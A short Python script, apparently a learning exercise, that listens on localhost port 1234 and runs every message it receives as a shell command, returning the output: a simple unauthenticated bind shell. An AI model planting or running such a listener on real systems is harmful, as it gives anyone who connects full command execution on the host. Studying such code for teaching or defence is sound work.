import socket
import os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.bind(('127.0.0.1',1234))

s.listen(3)

c,address = s.accept()
print("connection recieved from {} ".format(address))

banner = "Welcome ^-^!"
c.send(banner.encode())

msg = c.recv(2048).decode()

while msg!='quit':
    
    appender = " > log.txt 2>&1"

    cmd = msg + appender
    os.system(cmd)
    
    f = open("log.txt","r")
    msg = f.read()

    f.close()

    c.send(msg.encode())
    
    msg = c.recv(2048).decode()

c.close()

s.close()